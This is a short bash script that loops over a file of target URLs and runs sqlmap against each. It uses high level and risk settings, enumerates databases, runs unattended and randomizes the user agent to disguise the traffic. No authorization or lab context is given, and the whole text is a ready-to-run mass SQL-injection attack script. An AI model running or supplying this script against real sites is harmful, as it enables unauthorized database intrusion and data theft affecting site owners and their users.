while read url; do
  sqlmap -u "$url" --batch --random-agent --level=3 --risk=3 --dbs --threads=5 --timeout=10
done < targets.txt